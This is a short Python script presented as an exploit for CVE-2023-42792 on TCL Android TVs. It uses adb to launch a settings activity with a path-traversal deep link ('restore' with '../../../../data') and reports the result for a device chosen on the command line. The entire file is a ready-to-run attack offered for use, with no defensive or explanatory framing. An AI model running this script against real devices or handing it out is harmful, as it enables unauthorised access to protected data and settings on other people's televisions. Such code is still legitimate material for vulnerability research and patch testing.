#!/usr/bin/env python3
"""CVE-2023-42792 — TCL Android TV Intent. Implicit intent with a spoofed
component that the framework resolves to a privileged activity."""
import subprocess, sys

def exploit(host=None):
    adb = ["adb"] + (["-s", host] if host else [])
    cmd = adb + ["shell", "am", "start", "-a", "android.intent.action.VIEW",
                 "-d", "tcl://settings?action=restore&path=../../../../data",
                 "-n", "com.tcl.settings/.SettingsActivity",
                 "--ez", "android.intent.extra.RETURN_RESULT", "true"]
    r = subprocess.run(cmd, capture_output=True, text=True)
    print(r.stdout or r.stderr)
    return r.returncode == 0

def main():
    exploit(sys.argv[1] if len(sys.argv) > 1 else None)

if __name__ == "__main__":
    main()
